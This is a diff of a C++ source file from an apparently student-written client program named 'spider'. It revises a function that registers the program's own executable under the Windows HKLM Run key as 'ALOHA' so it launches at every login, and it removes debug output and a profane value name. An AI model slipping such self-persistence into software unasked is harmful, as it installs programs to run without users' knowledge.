@@ -8,28 +8,31 @@
 ** Last update Thu Oct 05 10:58:28 2017 Maxime PILLON
 */
 
-#include	<stdio.h>
 #include	<windows.h>
 #include 	"ClientCore.hpp"
 
 void		autorun()
 {
-  wchar_t	buffer[512];
+  char		buffer[MAX_PATH];
   HKEY		hkey;
   long		check;
+  LPCTSTR	lpSubKey = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+  const size_t	length = MAX_PATH * 2;
+  char		test[length] = {};
 
-  GetModuleFileName(NULL, reinterpret_cast<LPSTR>(buffer), MAX_PATH);
-  check = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
-		       "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
-		       0, KEY_ALL_ACCESS, &hkey);
-  std::cout << "toto\n";
-  std::cout << check << std::endl;
+  GetModuleFileName(nullptr, buffer, MAX_PATH);
+  check = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
+			  lpSubKey,
+			  0, nullptr, 0,
+			  (KEY_WRITE|KEY_READ), nullptr, &hkey, nullptr);
+  strcpy_s(test, length, "\"");
+  strcat_s(test, length, buffer);
+  strcat_s(test, length, "\"\0");
+  LPCTSTR name = TEXT("ALOHA");
   if (check == ERROR_SUCCESS)
-  {
-    std::cout << "jpasse là" << std::endl;
-    RegSetValueEx(hkey, "TA MERE LA PUTE ", 0, REG_SZ, (BYTE *)buffer, 512);
+    RegSetValueEx(hkey, name, 0, REG_SZ, (BYTE *)test, strlen(test)+1);
+  if (hkey != nullptr)
     RegCloseKey(hkey);
-  }
 }
 
 int			main()
@@ -37,6 +40,7 @@ int			main()
   spider::ClientCore	client;
 
   autorun();
+  std::cout << "passed autorun\n";
   client.run();
   return 0;
 }
